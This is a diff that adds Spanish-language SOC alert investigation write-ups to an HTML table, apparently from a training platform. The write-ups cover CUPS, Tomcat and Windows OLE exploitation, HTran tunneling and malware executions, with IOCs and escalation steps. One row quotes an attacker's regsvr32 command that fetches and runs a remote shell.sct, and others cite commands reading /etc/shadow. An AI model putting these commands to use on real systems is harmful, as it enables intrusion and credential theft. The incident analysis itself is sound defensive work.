@@ -1011,6 +1011,281 @@ details summary::-webkit-details-marker{display:none}
 					</details>
 				</td>
 			</tr>
+			<tr>
+				<td>Oct, 04, 2024, 12:11 PM</td>
+				<td>SOC329</td>
+				<td>CUPS RCE Detection via IPP Injection (CVE-2024-47177)</td>
+				<td>Critical</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1190</span><span class="tag">T1059</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectaron solicitudes IPP maliciosas contra el servicio CUPS del host Bernard (<span class="code-box">172.16.17.178</span>) el <span class="code-box">04-Oct-2024</span> a las <span class="code-box">12:11 PM</span>, asociadas a la explotación de <span class="code-box">CVE-2024-47177</span>. La actividad provocó la ejecución de comandos mediante <span class="code-box">foomatic-rip</span>, incluyendo la creación de una conexión de tipo reverse shell hacia <span class="code-box">18.217.36.165:9001</span>.
+
+						Posteriormente, el atacante ejecutó comandos de reconocimiento como <span class="code-box">whoami</span>, <span class="code-box">ls</span> y <span class="code-box">whoami /priv</span>, y realizó intentos de acceso a información sensible mediante <span class="code-box">cat /etc/passwd</span> y <span class="code-box">cat /etc/shadow</span>. También se observó la ejecución de <span class="code-box">sudo su</span>, lo que indica un intento de obtener privilegios elevados.
+
+						La ejecución se realizó bajo el usuario <span class="code-box">lp</span>. La evidencia disponible confirma ejecución de comandos y acceso interactivo al sistema mediante la reverse shell, pero no confirma por sí sola que se haya obtenido privilegio <span class="code-box">root</span>.
+
+						<strong>Indicadores de compromiso (IOC)</strong>
+						- IP del atacante: <span class="code-box">18.217.36.165</span>
+						- Puerto de conexión: <span class="code-box">9001</span>
+						- Host afectado: <span class="code-box">Bernard</span>
+						- IP del endpoint: <span class="code-box">172.16.17.178</span>
+						- Vulnerabilidad: <span class="code-box">CVE-2024-47177</span>
+						- Servicio afectado: <span class="code-box">CUPS / IPP</span>
+						- Proceso involucrado: <span class="code-box">foomatic-rip</span>
+						- Usuario de ejecución: <span class="code-box">lp</span>
+						- Comandos relevantes: <span class="code-box">whoami</span>, <span class="code-box">cat /etc/passwd</span>, <span class="code-box">cat /etc/shadow</span>, <span class="code-box">sudo su</span>
+
+						Explotación de CUPS mediante IPP Injection - ejecución de comandos - reverse shell - reconocimiento del sistema - acceso a archivos sensibles - intento de escalada de privilegios - es consistente con un compromiso exitoso del endpoint.
+
+						Se escala a SOC L2/IR para aislamiento del endpoint, bloqueo de la IP <span class="code-box">18.217.36.165</span>, revisión de actividad posterior y validación de posibles intentos de escalada de privilegios.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Oct, 08, 2024, 08:26 AM</td>
+				<td>SOC330</td>
+				<td>HTran network tunneling potentially associated with APT10 (MENUPASS) was detected</td>
+				<td>High</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1090</span><span class="tag">T1105</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectó actividad sospechosa en el host Jenessa (<span class="code-box">172.16.17.131</span>) el <span class="code-box">08-Oct-2024</span> a las <span class="code-box">08:26:16</span>, relacionada con la ejecución de la herramienta <span class="code-box">HTran</span> para realizar túnel de tráfico de red.
+
+						Durante el análisis del endpoint se observó que, minutos antes de la alerta, se realizó la clonación del repositorio de <span class="code-box">HTran</span> desde <span class="code-box">GitHub</span>. Posteriormente, el código fue compilado mediante <span class="code-box">gcc</span>, generando el ejecutable <span class="code-box">HTran</span>. A continuación, la herramienta fue ejecutada utilizando el modo <span class="code-box">slave</span>, estableciendo los parámetros de conexión <span class="code-box">218.27.4.98:4444</span> y <span class="code-box">18.189.13.47:80</span>.
+
+						La actividad posterior incluyó la ejecución de <span class="code-box">netstat -anp</span>, mientras que previamente se habían realizado consultas de red mediante <span class="code-box">ss -tuln</span> y <span class="code-box">ping google.com</span>. También se observaron consultas relacionadas con tareas programadas mediante <span class="code-box">crontab -l</span> y la lectura de <span class="code-box">/etc/crontab</span>.
+
+						La secuencia temporal confirma que <span class="code-box">HTran</span> no solo estaba presente en el sistema, sino que fue descargado, compilado y posteriormente ejecutado. El uso de esta herramienta junto con la configuración de un túnel de red constituye un indicador de posible redirección o encapsulación de tráfico entre diferentes destinos.
+
+						Adicionalmente, se identificaron intentos de fuerza bruta desde la dirección IP <span class="code-box">87.249.134.130</span> utilizando diferentes cuentas antes de la ejecución de HTran. Con los registros disponibles no se puede determinar si alguno de estos intentos de autenticación fue exitoso, por lo que no se establece una relación directa entre ambos eventos.
+
+						<strong>Indicadores de compromiso (IOC)</strong>
+						- Host afectado: <span class="code-box">Jenessa</span>
+						- IP del endpoint: <span class="code-box">172.16.17.131</span>
+						- Herramienta: <span class="code-box">HTran</span>
+						- Modo de ejecución: <span class="code-box">slave</span>
+						- Endpoint de conexión: <span class="code-box">218.27.4.98:4444</span>
+						- Endpoint de conexión: <span class="code-box">18.189.13.47:80</span>
+						- IP asociada a intentos de fuerza bruta: <span class="code-box">87.249.134.130</span>
+						- Compilador utilizado: <span class="code-box">gcc</span>
+						- Comandos de red: <span class="code-box">ss -tuln</span>, <span class="code-box">netstat -anp</span>, <span class="code-box">ping google.com</span>
+						- Comandos de tareas programadas: <span class="code-box">crontab -l</span>, <span class="code-box">cat /etc/crontab</span>
+
+						La secuencia observada - clonación de HTran - compilación mediante gcc - ejecución en modo slave - establecimiento de conexiones entre diferentes destinos - reconocimiento de red - es consistente con el uso de una herramienta de tunneling potencialmente utilizada para ocultar o redirigir tráfico de red.
+
+						Se escala a SOC L2/IR para investigar el propósito del túnel, validar las conexiones asociadas a <span class="code-box">218.27.4.98</span> y <span class="code-box">18.189.13.47</span>, revisar posible persistencia y determinar si los intentos de fuerza bruta desde <span class="code-box">87.249.134.130</span> guardan relación con el compromiso.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Oct, 11, 2024, 05:52 AM</td>
+				<td>SOC331</td>
+				<td>Zebrocy Malware Activity Detected (APT28)</td>
+				<td>Medium</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1566.001</span><span class="tag">T1204.002</span><span class="tag">T1057</span><span class="tag">T1082</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectó la ejecución del archivo <span class="code-box">2024 Financial Report.exe</span> en el endpoint Montague (<span class="code-box">172.16.17.132</span>) el <span class="code-box">11-Oct-2024</span> a las <span class="code-box">05:52 AM</span>. El ejecutable se encontraba en el directorio de descargas del usuario y su hash SHA-256 <span class="code-box">269908E1B76AFAF1D837BCE28640A1066808AAAC29E6BC6575581DCC907065D0</span> fue identificado por la regla de detección como asociado al malware <span class="code-box">Zebrocy</span>.
+
+						Durante el análisis se observaron actividades posteriores a la ejecución relacionadas con reconocimiento del sistema. Se identificó el uso de <span class="code-box">TASKLIST</span> para enumerar procesos, actividad asociada a <span class="code-box">T1057 - Process Discovery</span>, y <span class="code-box">SYSTEMINFO</span> para obtener información del sistema, correspondiente a <span class="code-box">T1082 - System Information Discovery</span>.
+
+						Adicionalmente, se observaron comandos de <span class="code-box">PowerShell</span> utilizados para recopilar información relacionada con el sistema operativo, hardware, drivers y entorno de virtualización o cloud. La presencia de estas acciones posteriores a la ejecución del archivo refuerza la evidencia de actividad maliciosa y reconocimiento del endpoint.
+
+						Existe además evidencia que sugiere que el archivo pudo haber llegado mediante un correo electrónico proveniente de <span class="code-box">pavlodar.news@bk.ru</span>. Esta circunstancia es consistente con una posible distribución mediante phishing con archivo malicioso, seguida de la ejecución por parte del usuario.
+
+						<strong>Indicadores de compromiso (IOC)</strong>
+						- Host afectado: <span class="code-box">Montague</span>
+						- IP del endpoint: <span class="code-box">172.16.17.132</span>
+						- Archivo: <span class="code-box">2024 Financial Report.exe</span>
+						- SHA-256: <span class="code-box">269908E1B76AFAF1D837BCE28640A1066808AAAC29E6BC6575581DCC907065D0</span>
+						- Malware: <span class="code-box">Zebrocy</span>
+						- Posible remitente: <span class="code-box">pavlodar.news@bk.ru</span>
+						- Comandos observados: <span class="code-box">TASKLIST</span>, <span class="code-box">SYSTEMINFO</span>, <span class="code-box">PowerShell</span>
+
+						La secuencia observada - posible phishing con archivo malicioso - ejecución de <span class="code-box">2024 Financial Report.exe</span> - identificación del archivo como <span class="code-box">Zebrocy</span> - Process Discovery - System Information Discovery - recopilación adicional mediante PowerShell - es consistente con una actividad de malware y reconocimiento posterior al compromiso.
+
+						Se escala a SOC L2/IR para aislamiento del endpoint, análisis del ejecutable y sus conexiones de red, hunting del hash <span class="code-box">269908E1B76AFAF1D837BCE28640A1066808AAAC29E6BC6575581DCC907065D0</span> y revisión de posibles mecanismos de persistencia o actividad posterior.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Oct, 21, 2024, 10:36 AM</td>
+				<td>SOC333</td>
+				<td>Denis Malware Activity Detected (APT32)</td>
+				<td>High</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1059.001</span><span class="tag">T1564</span><span class="tag">T1204.002</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectó la ejecución de <span class="code-box">denis.exe</span> en el endpoint Brendan (<span class="code-box">172.16.17.135</span>) el <span class="code-box">21-Oct-2024</span> a las <span class="code-box">10:36:10</span>. El archivo fue ejecutado desde el directorio de descargas y su hash SHA-256 <span class="code-box">12C2C3566C29F80478277E0F96B79FC85B9E86EBF16505D8F2D7877A6204F860</span> fue identificado por la regla como asociado al malware <span class="code-box">Denis</span>.
+
+						Previamente se observó que el archivo <span class="code-box">denis.zip</span> fue extraído mediante <span class="code-box">7-Zip</span> utilizando la contraseña <span class="code-box">infected</span>, seguido de la ejecución de <span class="code-box">denis.exe</span>. Esta secuencia es consistente con una cadena de entrega, extracción y ejecución de malware.
+
+						Antes de la ejecución del binario se identificó el uso de <span class="code-box">PowerShell</span> para ejecutar <span class="code-box">setup.v1.0.0.3.ps1</span>, modificando temporalmente la política de ejecución mediante <span class="code-box">Set-ExecutionPolicy -Scope Process Bypass</span>. Esta configuración permite ejecutar scripts de PowerShell sin aplicar las restricciones habituales de la política de ejecución durante el proceso.
+
+						También se observó el uso de <span class="code-box">nslookup.exe</span> contra <span class="code-box">outlook.officebetas.com</span>, actividad compatible con la resolución de infraestructura externa y potencialmente relacionada con la actividad del malware.
+
+						La alerta presenta además indicios de un posible vector de entrada mediante correo electrónico, debido a que el usuario <span class="code-box">support@appofficedrive.com</span> recibió un correo pocos minutos antes de la actividad maliciosa. Sin embargo, con los registros disponibles no es posible confirmar que dicho correo haya sido responsable de la infección.
+
+						Actualmente no se observan logs de conexiones de red asociados directamente con la actividad. Esta ausencia representa una limitación de visibilidad y podría deberse a que los eventos no fueron registrados, no están siendo recolectados o no se encuentran disponibles. No existe evidencia suficiente para afirmar que los registros hayan sido eliminados.
+
+						<strong>Indicadores de compromiso (IOC)</strong>
+						- Host afectado: <span class="code-box">Brendan</span>
+						- IP del endpoint: <span class="code-box">172.16.17.135</span>
+						- Malware: <span class="code-box">Denis</span>
+						- Archivo: <span class="code-box">denis.exe</span>
+						- Archivo comprimido: <span class="code-box">denis.zip</span>
+						- SHA-256: <span class="code-box">12C2C3566C29F80478277E0F96B79FC85B9E86EBF16505D8F2D7877A6204F860</span>
+						- Script: <span class="code-box">setup.v1.0.0.3.ps1</span>
+						- Dominio consultado: <span class="code-box">outlook.officebetas.com</span>
+						- Herramientas/comandos: <span class="code-box">7-Zip</span>, <span class="code-box">PowerShell</span>, <span class="code-box">nslookup.exe</span>
+						- Posible remitente/vector: <span class="code-box">support@appofficedrive.com</span>
+
+						La secuencia observada - extracción de archivo comprimido - ejecución de <span class="code-box">denis.exe</span> identificado como malware - ejecución de PowerShell con política <span class="code-box">Bypass</span> - resolución DNS de infraestructura externa - es consistente con actividad maliciosa y posible compromiso del endpoint.
+
+						Se escala a SOC L2/IR para aislamiento del endpoint, análisis del malware y sus artefactos asociados, revisión de los logs de correo para determinar el origen del archivo y hunting en DNS, proxy, firewall y demás fuentes de red para identificar posibles comunicaciones con infraestructura externa.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Jan, 10, 2025, 06:05 PM</td>
+				<td>SOC334</td>
+				<td>Apache Tomcat RCE Exploitation Detected (CVE-2024-50379)</td>
+				<td>Critical</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1190</span><span class="tag">T1059</span><span class="tag">T1087</span><span class="tag">T1057</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectó la explotación de la vulnerabilidad <span class="code-box">CVE-2024-50379</span> en el servidor TOM-Upload01 (<span class="code-box">172.16.20.47</span>) el <span class="code-box">10-Jan-2025</span> a las <span class="code-box">18:05:32</span>. La actividad se originó desde la dirección IP <span class="code-box">3.144.85.113</span>, que realizó múltiples solicitudes POST hacia <span class="code-box">/upload.jsp</span>, observándose además la carga del archivo <span class="code-box">FILE.jsp</span>.
+
+						La explotación corresponde a una condición de carrera TOCTOU (Time-of-Check Time-of-Use) utilizada junto con un bypass de sensibilidad a mayúsculas/minúsculas, permitiendo potencialmente modificar o sobrescribir archivos dentro del servidor Tomcat.
+
+						Durante el análisis posterior a la explotación se observó actividad asociada al proceso <span class="code-box">tomcat11.exe</span>, desde el cual fueron ejecutados los comandos <span class="code-box">whoami</span>, <span class="code-box">whoami -priv</span>, <span class="code-box">net user</span> y <span class="code-box">tasklist</span>. Estos comandos permitieron obtener información sobre el usuario actual, privilegios, cuentas existentes y procesos activos, evidenciando actividad de reconocimiento posterior a la explotación.
+
+						También se observaron múltiples conexiones provenientes de la dirección IP <span class="code-box">3.144.85.113</span> hacia el servidor en distintos momentos posteriores a la explotación. La recurrencia de estas conexiones, junto con la ejecución de comandos mediante <span class="code-box">tomcat11.exe</span>, constituye evidencia consistente con una posible explotación exitosa y actividad posterior por parte del atacante.
+
+						El archivo <span class="code-box">FILE.jsp</span> fue encontrado en el directorio de uploads. Sin embargo, debido a que el archivo ya se encontraba presente en el servidor, no es posible confirmar únicamente con esta evidencia que haya sido creado durante el ataque. Se requiere correlacionar timestamps, logs de Tomcat y actividad del sistema de archivos para determinar si fue modificado o utilizado durante la explotación.
+
+						<strong>Indicadores de compromiso (IOC)</strong>
+						- Servidor afectado: <span class="code-box">TOM-Upload01</span>
+						- IP del servidor: <span class="code-box">172.16.20.47</span>
+						- IP de origen: <span class="code-box">3.144.85.113</span>
+						- Vulnerabilidad: <span class="code-box">CVE-2024-50379</span>
+						- Endpoint: <span class="code-box">/upload.jsp</span>
+						- Archivo: <span class="code-box">FILE.jsp</span>
+						- Proceso: <span class="code-box">tomcat11.exe</span>
+						- Comandos observados: <span class="code-box">whoami</span>, <span class="code-box">whoami -priv</span>, <span class="code-box">net user</span>, <span class="code-box">tasklist</span>
+
+						La secuencia observada — explotación de <span class="code-box">CVE-2024-50379</span> → carga de archivo JSP → ejecución de comandos mediante <span class="code-box">tomcat11.exe</span> → reconocimiento del sistema → conexiones posteriores desde la infraestructura atacante — es consistente con una explotación exitosa y actividad posterior al compromiso.
+
+						Como medida de contención, se aisló el endpoint TOM-Upload01 de la red para evitar nuevas comunicaciones con la infraestructura atacante y limitar una posible continuación del ataque.
+
+						Se escala a SOC L2/IR para continuar con el análisis de compromiso, incluyendo revisión de persistencia, cuentas creadas o modificadas, conexiones realizadas desde el servidor, posibles movimientos laterales y análisis del archivo <span class="code-box">FILE.jsp</span>. Se requiere además remediar la vulnerabilidad <span class="code-box">CVE-2024-50379</span> mediante la actualización de Apache Tomcat a una versión corregida.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Jan, 22, 2025, 02:37 AM</td>
+				<td>SOC335</td>
+				<td>CVE-2024-49138 Exploitation Detected</td>
+				<td>Medium</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1068</span><span class="tag">T1059.001</span><span class="tag">T1033</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectó actividad sospechosa en el host Victor (<span class="code-box">172.16.17.207</span>) el <span class="code-box">22-Jan-2025</span> a las <span class="code-box">02:37:00</span>, asociada a la posible explotación de la vulnerabilidad <span class="code-box">CVE-2024-49138</span> para realizar una escalada de privilegios. La alerta SOC335 identifica la ejecución de <span class="code-box">svohost.exe</span>, ubicado en <span class="code-box">C:\temp\service_installer</span>, cuyo comportamiento fue relacionado con patrones de explotación conocidos.
+
+						Como parte de la cadena de ejecución, <span class="code-box">powershell.exe</span> ejecutó comandos para descargar <span class="code-box">service-installer.zip</span> desde un bucket S3 externo, extraerlo mediante <span class="code-box">7-Zip</span> utilizando una contraseña y posteriormente ejecutar <span class="code-box">svohost.exe</span>.
+
+						El proceso <span class="code-box">svohost.exe</span> generó <span class="code-box">powershell.exe</span> bajo la cuenta <span class="code-box">NT AUTHORITY\SYSTEM</span>, lo que representa un indicador relevante de posible elevación de privilegios. Esta ejecución con privilegios SYSTEM requiere investigación adicional para determinar si la vulnerabilidad fue explotada exitosamente.
+
+						Posteriormente se observó la ejecución de <span class="code-box">whoami.exe</span> y <span class="code-box">whoami.exe /priv</span>, comandos utilizados para identificar la cuenta bajo la cual se está ejecutando el proceso y verificar los privilegios disponibles.
+
+						También se detectó la ejecución de <span class="code-box">conhost.exe -ForceV1</span>, asociada al proceso sospechoso.
+
+						<strong>Indicadores de compromiso (IOC)</strong>
+						- Host afectado: <span class="code-box">Victor</span>
+						- IP del endpoint: <span class="code-box">172.16.17.207</span>
+						- Vulnerabilidad: <span class="code-box">CVE-2024-49138</span>
+						- Binario: <span class="code-box">svohost.exe</span>
+						- Ruta: <span class="code-box">C:\temp\service_installer</span>
+						- Archivo descargado: <span class="code-box">service-installer.zip</span>
+						- Proceso: <span class="code-box">powershell.exe</span>
+						- Cuenta observada: <span class="code-box">NT AUTHORITY\SYSTEM</span>
+						- Comandos: <span class="code-box">whoami.exe</span>, <span class="code-box">whoami.exe /priv</span>
+						- Proceso adicional: <span class="code-box">conhost.exe -ForceV1</span>
+
+						La secuencia observada - descarga de archivo comprimido desde Internet - extracción mediante <span class="code-box">7-Zip</span> - ejecución de <span class="code-box">svohost.exe</span> - generación de <span class="code-box">powershell.exe</span> bajo <span class="code-box">NT AUTHORITY\SYSTEM</span> → enumeración de identidad y privilegios - es consistente con una posible explotación seguida de escalada de privilegios y actividad posterior al compromiso.
+
+						Aunque la acción del dispositivo figura como <span class="code-box">Allowed</span>, esto únicamente indica que el control de seguridad permitió la actividad y no descarta un comportamiento malicioso.
+
+						Se escala a SOC L2/IR para continuar con la investigación, incluyendo análisis de <span class="code-box">svohost.exe</span>, revisión de procesos hijos, conexiones de red, persistencia, cuentas modificadas o creadas y búsqueda de los mismos IOCs en otros endpoints. Se recomienda además aislar el endpoint Victor para limitar una posible actividad posterior al compromiso.
+						</div>
+					</details>
+				</td>
+			</tr>
+			<tr>
+				<td>Feb, 04, 2025, 04:18 PM</td>
+				<td>SOC336</td>
+				<td>Windows OLE Zero-Click RCE Exploitation Detected (CVE-2025-21298)</td>
+				<td>Critical</td>
+				<td><span class="result tp">TP</span></td>
+				<td><span class="tag">T1566.001</span><span class="tag">T1203</span><span class="tag">T1218.010</span><span class="tag">T1059.003</span></td>
+				<td>
+					<details>
+						<summary>Details</summary>
+						<div style="white-space:pre-line;line-height:1.6;margin-top:12px;color:#cbd5e1;">
+						Se detectó una campaña de posible explotación de <span class="code-box">CVE-2025-21298</span> mediante un archivo RTF malicioso enviado por correo electrónico al usuario <span class="code-box">Austin@letsdefend.io</span>. El correo provenía de la dirección IP <span class="code-box">84.38.130.118</span> y contenía el archivo <span class="code-box">mail.rtf</span>, identificado con un patrón de explotación conocido para la vulnerabilidad Windows OLE Zero-Click RCE. La acción del dispositivo fue <span class="code-box">Allowed</span>, por lo que el archivo pudo llegar al destinatario.
+
+						Posteriormente, se observó la ejecución de <span class="code-box">cmd.exe</span>, que invocó <span class="code-box">regsvr32.exe</span> utilizando <span class="code-box">scrobj.dll</span> y una URL externa mediante el siguiente comando:
+
+						<span class="code-box">regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll</span>
+
+						El uso de <span class="code-box">regsvr32.exe</span> para cargar contenido mediante un archivo <span class="code-box">.sct</span> alojado remotamente es especialmente sospechoso y es compatible con la técnica <strong>Signed Binary Proxy Execution: Regsvr32</strong>. Esta técnica permite abusar de un binario legítimo de Windows para ejecutar contenido potencialmente malicioso.
+
+						El archivo <span class="code-box">mail.rtf</span> además presenta múltiples detecciones por motores antivirus, con <span class="code-box">28/62</span> proveedores identificándolo como malicioso, lo que incrementa la confianza en que se trata de un archivo malicioso.
+
+						<strong>Indicadores de compromiso (IOC)</strong>
+						- Usuario afectado: <span class="code-box">Austin@letsdefend.io</span>
+						- IP de origen: <span class="code-box">84.38.130.118</span>
+						- Archivo: <span class="code-box">mail.rtf</span>
+						- Vulnerabilidad: <span class="code-box">CVE-2025-21298</span>
+						- Proceso: <span class="code-box">cmd.exe</span>
+						- Binario utilizado: <span class="code-box">regsvr32.exe</span>
+						- DLL: <span class="code-box">scrobj.dll</span>
+						- Archivo remoto: <span class="code-box">shell.sct</span>
+						- Detección antivirus: <span class="code-box">28/62</span>
+
+						La secuencia observada - correo con archivo RTF malicioso - posible explotación de <span class="code-box">CVE-2025-21298</span> - ejecución de <span class="code-box">cmd.exe</span> - utilización de <span class="code-box">regsvr32.exe</span> - acceso a un archivo <span class="code-box">.sct</span> remoto - es consistente con una cadena de ataque y evidencia de ejecución posterior asociada a la explotación.
+
+						Aunque la acción del dispositivo figura como <span class="code-box">Allowed</span>, esto únicamente indica que el control de seguridad permitió la actividad y no descarta el compromiso del endpoint.
+
+						Se escala a SOC L2/IR para investigar el posible compromiso del endpoint, analizar la carga remota, revisar procesos posteriores, conexiones de red, persistencia y buscar los mismos IOCs en otros endpoints. Se recomienda además aislar el endpoint afectado para limitar una posible continuación del ataque.
+						</div>
+					</details>
+				</td>
+			</tr>
 		</tbody>
 		</table>
 </div>
